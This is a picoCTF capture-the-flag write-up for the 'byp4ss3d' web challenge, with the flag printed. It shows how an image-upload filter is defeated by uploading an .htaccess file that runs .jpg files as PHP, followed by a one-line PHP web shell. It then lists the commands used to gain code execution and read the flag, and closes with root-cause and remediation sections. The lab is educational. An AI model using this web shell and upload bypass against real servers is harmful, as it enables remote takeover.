# 🚩 picoCTF — byp4ss3d

> **Category:** Web Exploitation | **Difficulty:** Medium  
> **Flag:** `picoCTF{s3rv3r_byp4ss_0c257942}`

---

## 📌 Challenge Description

A university registration portal allows students to upload images of their ID cards for verification. The developer implemented filters to allow only image uploads.

> **Goal:** Analyze the upload mechanism and determine whether the restrictions can be bypassed to interact with the server.

---

## 🔎 Analysis

| Component | Details |
|-----------|---------|
| Server | Apache HTTP Server |
| Filter | Blocks `.php` extensions, allows images only |
| Vulnerability | `.htaccess` upload not restricted |

The server runs **Apache HTTP Server**, which processes `.htaccess` files to override directory-level configurations. Since the filter only blocks `.php` extensions — but **not `.htaccess`** — we can redefine how Apache handles file extensions entirely.

---

## ⚡ Exploitation

### Step 1 — Upload `.htaccess`

Create a `.htaccess` file that forces Apache to treat `.jpg` files as PHP scripts:

```apacheconf
AddType application/x-httpd-php .jpg
```

Upload this file through the ID card upload form.

---

### Step 2 — Upload Web Shell as `.jpg`

Create a file named `shell.jpg` containing a PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

Upload `shell.jpg` through the same upload form.  
The server stores it at: `/images/shell.jpg`

---

### Step 3 — Confirm Remote Code Execution

Since Apache now treats `.jpg` as PHP (thanks to our `.htaccess`), we can execute commands:

```
GET /images/shell.jpg?cmd=whoami
```

✅ RCE confirmed — command output is returned in the response.

---

### Step 4 — Locate the Flag

```
GET /images/shell.jpg?cmd=find / -name flag*
```

**Output:**
```
/var/www/flag.txt
```

---

### Step 5 — Read the Flag

```
GET /images/shell.jpg?cmd=cat /var/www/flag.txt
```

**Output:**
```
picoCTF{s3rv3r_byp4ss_0c257942}
```

---

## 🗺️ Attack Chain

```
[Upload .htaccess]
   → Apache now treats .jpg as PHP
        ↓
[Upload shell.jpg (PHP webshell)]
   → Stored at /images/shell.jpg
        ↓
[GET /images/shell.jpg?cmd=whoami]
   → RCE confirmed
        ↓
[find / -name flag*]
   → /var/www/flag.txt
        ↓
[cat /var/www/flag.txt]
   → picoCTF{s3rv3r_byp4ss_0c257942} 🚩
```

---

## 🧠 Root Cause

The vulnerability existed due to **two compounding misconfigurations:**

1. **Incomplete upload validation** — The filter blocked `.php` but allowed any other file type including `.htaccess`
2. **Apache `.htaccess` processing enabled** — `AllowOverride` was not set to `None`, allowing directory-level config overrides

---

## 🛡️ Remediation

| Fix | How |
|-----|-----|
| Block `.htaccess` uploads | Add it to the file extension denylist |
| Use allowlist validation | Only permit `image/jpeg`, `image/png` via MIME type check — not just extension |
| Disable `.htaccess` | Set `AllowOverride None` in Apache config |
| Store uploads outside webroot | Files in `/var/www/uploads/` can't be executed via HTTP |
| Rename uploaded files | Use UUID filenames — prevents predictable shell path |

---

## 📚 References

- [Apache AllowOverride Directive](https://httpd.apache.org/docs/2.4/mod/core.html#allowoverride)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [HackTricks — File Upload Bypass](https://book.hacktricks.xyz/pentesting-web/file-upload)

---

*Writeup by: [Vivek Bhandari] | picoCTF*

